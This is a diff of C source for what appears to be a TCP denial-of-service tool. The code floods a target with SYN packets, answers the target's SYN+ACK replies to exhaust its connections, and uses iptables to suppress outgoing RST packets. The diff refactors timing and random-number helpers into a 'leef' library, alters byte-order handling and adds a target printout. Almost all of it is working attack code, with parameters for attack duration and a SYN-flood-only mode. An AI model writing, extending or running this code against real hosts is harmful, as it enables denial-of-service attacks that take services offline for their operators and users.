@@ -8,9 +8,9 @@
 #include <stdlib.h>
 #include <signal.h>
 #include <string.h>
+#include <unistd.h>
 #include <time.h>
 #include <sys/time.h>
-#include <unistd.h>
 
 int running = 1;
 uint32_t interface_addr;
@@ -23,43 +23,22 @@ uint8_t *send_data = NULL;
 int send_data_size = 0;
 int syn_flood_only = 0;
 
-inline uint32_t getTicks() {
-    static struct timeval tv;
-    static unsigned long firstTick = 0;
-    gettimeofday(&tv, 0);
-    if(!firstTick)
-        firstTick = tv.tv_sec;
-    return ((tv.tv_sec - firstTick) * 1000) + (tv.tv_usec / 1000);
-}
-
-inline int random_range(int min, int max) {
-    return (int)(min + (rand() % (max - min + 1)));
-}
-
-inline uint8_t random_byte() {
-    return (uint8_t)(rand() % 256);
-}
-
-void signal_handler(int sig)
-{
+void signal_handler(int sig) {
     running = 0;
 }
 
 void syn_thread()
 {
-    /* seed rand */
-    struct timeval tv;
-    gettimeofday(&tv,NULL);
-    srand((tv.tv_sec * 1000) + (tv.tv_usec / 1000));
+    leef_srand();
 
-    uint16_t src_port = random_range(32768,65534);
+    uint16_t src_port = leef_random_range(1025,65535);
     uint16_t id;
     uint32_t seq;
 
-    while(running && (attack_time <= 0 || getTicks() < attack_time)) {
-        if(++src_port == 65535)
+    while(running && (attack_time <= 0 || leef_get_ticks() < attack_time)) {
+        if(++src_port <= 1024)
             src_port = 1025;
-        id = random_byte() << 8 | random_byte();
+        id = leef_random_byte() << 8 | leef_random_byte();
         seq = attack_uuid << 16 | id;
         leef_send_tcp_syn(interface_addr, dest_addr, src_port, dest_port, id, seq);
         usleep(sleep_interval);
@@ -88,23 +67,25 @@ void sniff_thread()
     system("/usr/sbin/iptables -F OUTPUT");
     system("/usr/sbin/iptables -I OUTPUT -p tcp --tcp-flags ALL RST -j DROP");
 
-    lastTicks = getTicks();
-    printf("wait\r");
+    lastTicks = leef_get_ticks();
+
+    printf("wait 1 sec\r");
     fflush(stdout);
-    while(running && (attack_time <= 0 || getTicks() < attack_time)) {
+
+    while(running && (attack_time <= 0 || leef_get_ticks() < attack_time)) {
         if(leef_sniff_next_packet(&packet)) {
             /* check if the packet is from the host */
-            if(packet.ip->protocol == IPPROTO_TCP && packet.ip->saddr == dest_addr && htons(packet.in_ip.tcp->source) == dest_port) {
+            if(packet.ip->protocol == IPPROTO_TCP && packet.ip->saddr == dest_addr && packet.in_ip.tcp->source == dest_port) {
                 /* check if the packet was from this running attack instance */
-                if(packet.in_ip.tcp->ack == 1 && attack_uuid != ((htonl(packet.in_ip.tcp->ack_seq) & 0xffff0000) >> 16))
+                if(packet.in_ip.tcp->ack == 1 && attack_uuid != ((packet.in_ip.tcp->ack_seq & 0xffff0000) >> 16))
                     continue;
-                src_port = htons(packet.in_ip.tcp->dest);
+                src_port = packet.in_ip.tcp->dest;
                 /* SYN+ACK */
                 if(packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 1) {
                     if(!syn_flood_only) {
-                        id = ((htonl(packet.in_ip.tcp->ack_seq) - 1) & 0xffff) + 1;
-                        seq = htonl(packet.in_ip.tcp->ack_seq);
-                        ack_seq = htonl(packet.in_ip.tcp->seq) + 1;
+                        id = ((packet.in_ip.tcp->ack_seq - 1) & 0xffff) + 1;
+                        seq = packet.in_ip.tcp->ack_seq;
+                        ack_seq = packet.in_ip.tcp->seq + 1;
 
                         if(send_data_size) {
                             leef_send_raw_tcp(interface_addr, dest_addr, src_port, dest_port, id, seq, ack_seq,
@@ -139,7 +120,7 @@ void sniff_thread()
                 } else if(packet.in_ip.tcp->fin == 1) {
                     static int warned = 0;
                     if(!warned && fin_received == 0) {
-                        printf("\nhost started ending connections, guessed connection timeout: %d secs\n", getTicks() / 1000);
+                        printf("\nhost started ending connections, guessed connection timeout: %d secs\n", leef_get_ticks() / 1000);
                         fflush(stdout);
                         warned = 1;
                     }
@@ -153,27 +134,29 @@ void sniff_thread()
                 }
             /* check if the packet is to the host */
             } else if(packet.ip->protocol == IPPROTO_TCP &&
-                      packet.ip->saddr == interface_addr && packet.ip->daddr == dest_addr && htons(packet.in_ip.tcp->dest) == dest_port
+                      packet.ip->saddr == interface_addr && packet.ip->daddr == dest_addr && packet.in_ip.tcp->dest == dest_port
                       && packet.in_ip.tcp->syn == 1 && packet.in_ip.tcp->ack == 0) {
-                if(attack_uuid != ((htonl(packet.in_ip.tcp->seq) & 0xffff0000) >> 16))
+                if(attack_uuid != ((packet.in_ip.tcp->seq & 0xffff0000) >> 16))
                     continue;
                 syn_sent++;
-                if(!syn_flood_only && conn_ports[htons(packet.in_ip.tcp->source)] == 1) {
-                    conn_ports[htons(packet.in_ip.tcp->source)] = 0;
+                if(!syn_flood_only && conn_ports[packet.in_ip.tcp->source] == 1) {
+                    conn_ports[packet.in_ip.tcp->source] = 0;
                     alive_connections--;
                 }
             }
         }
-        if(getTicks() - lastTicks >= 1000) {
+
+        if(leef_get_ticks() - lastTicks >= 1000) {
             printf("SYN: %d/s, SYN+ACK: %d/s, RST: %d/s, FIN: %d/s, NEW CONNs: %d/sec, FAILED CONNs: %d/sec, ALIVE CONNs: %d         \r",
                    syn_sent, synack_received, rst_received, fin_received, new_connections, syn_sent - new_connections, alive_connections);
             fflush(stdout);
+
             synack_received = 0;
             rst_received = 0;
             fin_received = 0;
             syn_sent = 0;
             new_connections = 0;
-            lastTicks = getTicks();
+            lastTicks = leef_get_ticks();
         }
     }
     printf("\n");
@@ -200,6 +183,8 @@ int main(int argc, char **argv)
         printf("* default attack time: infinite\n");
         return 0;
     }
+
+    /* generate attack uuid */
     static struct timeval tv;
     gettimeofday(&tv, 0);
     attack_uuid = (((tv.tv_sec % 1000) * 1000) + (tv.tv_usec / 1000)) & 0xffff;
@@ -247,6 +232,7 @@ int main(int argc, char **argv)
     }
 
     printf("stating synack..\n");
+    printf("target: %s:%d\n", leef_addr_to_string(dest_addr), dest_port);
 
     pid_t pid = fork();
     if(pid == 0) // child
